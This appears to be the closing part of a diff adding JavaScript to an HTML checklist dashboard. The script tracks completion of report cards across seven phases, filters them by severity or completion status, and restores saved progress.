+    function updateMaster() { const allItems = document.querySelectorAll('.checklist-item'); const allDone = document.querySelectorAll('.checklist-item.done'); const pct = allItems.length ? Math.round(allDone.length / allItems.length * 100) : 0; document.getElementById('masterPct').textContent = pct + '%'; document.getElementById('masterBar').style.width = pct + '%'; document.getElementById('completedItems').textContent = allDone.length; const cards = document.querySelectorAll('.report-card'); let cc = 0; cards.forEach(c => { const t = c.querySelectorAll('.checklist-item').length; const d = c.querySelectorAll('.checklist-item.done').length; if (t && d === t) cc++ }); document.getElementById('completedCards').textContent = cc; const phases = [{ grid: 'grid-phase1', count: 'p1count', total: 5 }, { grid: 'grid-phase2', count: 'p2count', total: 5 }, { grid: 'grid-phase3', count: 'p3count', total: 5 }, { grid: 'grid-phase4', count: 'p4count', total: 5 }, { grid: 'grid-phase5', count: 'p5count', total: 5 }, { grid: 'grid-phase6', count: 'p6count', total: 5 }, { grid: 'grid-phase7', count: 'p7count', total: 10 }]; phases.forEach(p => { const grid = document.getElementById(p.grid); if (!grid) return; const pc = grid.querySelectorAll('.report-card'); let done = 0; pc.forEach(c => { const t = c.querySelectorAll('.checklist-item').length; const d = c.querySelectorAll('.checklist-item.done').length; if (t && d === t) done++ }); document.getElementById(p.count).textContent = done + ' / ' + p.total + ' reports' }) }
+    function filterCards(type, btn) { document.querySelectorAll('.filter-btn').forEach(b => b.classList.remove('active')); btn.classList.add('active'); document.querySelectorAll('.report-card').forEach(card => { const sev = card.dataset.severity; const items = card.querySelectorAll('.checklist-item').length; const done = card.querySelectorAll('.checklist-item.done').length; const isComplete = items && done === items; let show = true; if (type === 'critical') show = sev === 'critical'; else if (type === 'high') show = sev === 'high'; else if (type === 'medium') show = sev === 'medium'; else if (type === 'complete') show = isComplete; else if (type === 'incomplete') show = !isComplete; card.style.display = show ? '' : 'none' }) }
+    (function () { const s = loadState(); document.querySelectorAll('.report-card').forEach(card => { const cardId = card.id; if (s[cardId]) { const items = [...card.querySelectorAll('.checklist-item')]; Object.keys(s[cardId]).forEach(idx => { if (s[cardId][idx] && items[idx]) items[idx].classList.add('done') }) } updateCardProgress(card) }); updateMaster() })();
+</script>
+</body>
+
+</html>
